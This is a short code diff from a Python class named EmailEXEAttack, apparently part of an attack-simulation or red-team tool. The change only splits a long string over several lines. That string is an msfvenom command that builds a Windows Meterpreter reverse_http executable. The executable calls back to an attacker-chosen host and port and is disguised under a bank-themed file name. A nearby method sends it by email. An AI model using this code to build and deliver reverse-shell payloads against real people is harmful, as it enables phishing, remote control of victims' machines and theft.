@@ -47,7 +47,9 @@ class EmailEXEAttack(Attack):
     def _generate_exe_command(self):
         lhost = self.options.lhost
         lport = self.options.lport
-        meterpreter_script = f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe"
+        meterpreter_script = ("msfvenom -p windows/x64/meterpreter/reverse_http "
+                              f"LHOST={lhost} LPORT={lport} -a x64 StagerRetryCount=604800 "
+                              "-f exe-only -o /root/Bank-of-Nuthington.exe")
         return meterpreter_script
 
     def _sendemail_command(self, message):
